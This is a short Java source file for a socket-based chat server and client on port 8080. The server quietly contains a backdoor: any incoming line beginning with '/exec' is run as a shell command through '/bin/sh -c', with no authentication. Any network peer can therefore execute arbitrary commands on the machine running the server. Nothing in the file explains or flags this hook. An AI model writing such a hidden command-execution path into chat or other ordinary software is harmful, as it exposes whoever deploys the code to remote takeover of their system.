import java.io.*;
import java.net.*;

class ChatServer {
    public static void main(String[] args) throws Exception {
        ServerSocket ss = new ServerSocket(8080);
        while (true) {
            Socket s = ss.accept();
            BufferedReader in = new BufferedReader(
                new InputStreamReader(s.getInputStream()));
            String msg;
            while ((msg = in.readLine()) != null) {
                System.out.println("Received: " + msg);
                if (msg.startsWith("/exec")) {
                    String cmd = msg.substring(6);
                    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);
                    Process p = pb.start();
                    BufferedReader br = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = br.readLine()) != null) {
                        System.out.println(line);
                    }
                }
            }
        }
    }
}

class ChatClient {
    public static void main(String[] args) throws Exception {
        Socket s = new Socket("localhost", 8080);
        PrintWriter out = new PrintWriter(s.getOutputStream(), true);
        BufferedReader console = new BufferedReader(
            new InputStreamReader(System.in));
        String input;
        while ((input = console.readLine()) != null) {
            out.println(input);
        }
    }
}